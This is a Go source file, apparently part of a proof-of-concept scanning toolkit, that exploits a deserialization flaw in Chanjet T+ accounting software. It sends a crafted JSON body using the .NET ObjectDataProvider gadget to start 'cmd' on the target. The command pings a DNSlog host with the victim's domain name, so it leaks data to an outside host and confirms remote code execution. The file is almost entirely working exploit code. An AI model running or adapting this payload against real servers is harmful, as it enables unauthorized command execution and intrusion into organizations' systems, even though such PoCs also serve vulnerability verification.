package poc

import (
	"PocSir/config"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

func Tplus_RCE(target string) {
	pocUrl := target + "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore"
	headers := map[string]string{
		"User-Agent":       getRandUa(),
		"X-Ajaxpro-Method": "GetStoreWarehouseByStore",
	}
	dnslog := config.Config()
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}
	verifyPoc := []byte(`{"storeID":{}}`)
	attackPoc := fmt.Sprintf(`{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c ping -n 3 %%USERDOMAIN%%.%s"
        }
    }
  }
}`, dnslog)

	req1, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(verifyPoc))
	if err != nil {
		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}

	for key, value := range headers {
		req1.Header.Set(key, value)
	}
	resp1, err := client.Do(req1)
	if err != nil {
		config.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}

	defer resp1.Body.Close()
	body, _ := io.ReadAll(resp1.Body)
	if resp1.StatusCode == http.StatusOK && strings.Contains(string(body), "archivesId") {
		config.Right.Printf("[+]%s存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n", target)

		req2, err2 := http.NewRequest("POST", pocUrl, bytes.NewBuffer([]byte(attackPoc)))
		if err2 != nil {
			config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
			return
		}
		for key, value := range headers {
			req2.Header.Set(key, value)
		}
		resp2, err3 := client.Do(req2)
		if err3 != nil {
			config.ErrMsg.Printf("[-]%s is timeout\n", target)
			return
		}
		defer resp2.Body.Close()
		body2, _ := io.ReadAll(resp2.Body)
		if resp2.StatusCode == http.StatusOK && strings.Contains(string(body2), "archivesId") {
			config.Right.Printf("[+]ping -n 3 %%USERDOMAIN%%.%s 命令执行成功,请查看您的dnslog平台\n", dnslog)
		} else {
			config.Right.Printf("[-]ping -n 3 %%USERDOMAIN%%.%s 命令执行失败,请重试或检查服务器通信\n", dnslog)
		}
	} else {
		config.ErrMsg.Printf("[-]%s不存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n", target)
	}

}
